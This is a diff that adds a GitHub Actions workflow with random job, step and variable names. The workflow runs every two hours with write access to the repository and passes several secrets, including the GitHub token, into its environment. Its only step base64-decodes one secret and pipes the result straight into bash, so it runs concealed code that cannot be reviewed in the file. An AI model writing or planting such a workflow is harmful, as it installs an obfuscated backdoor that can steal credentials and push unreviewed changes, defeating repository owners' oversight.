@@ -1,0 +1,21 @@
+name: K8qFHwboocWj5Ab
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  aRov3BCEBJd:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.yCQ96mCt }}
+      - name: pQUAM
+        env:
+          nhS5k3GC1nfPIR9: ${{ secrets.ax4VTJwb8Fb0wI }}
+          InlkiONkOc9ABUB6: ${{ secrets.RGT8pZi }}
+          Y1ruTdTwfX3: ${{ secrets.nfzDqHjeR08I9ywt }}
+          GITHUB_TOKEN: ${{ secrets.yCQ96mCt }}
+        run: echo "$nhS5k3GC1nfPIR9" | base64 -d | bash
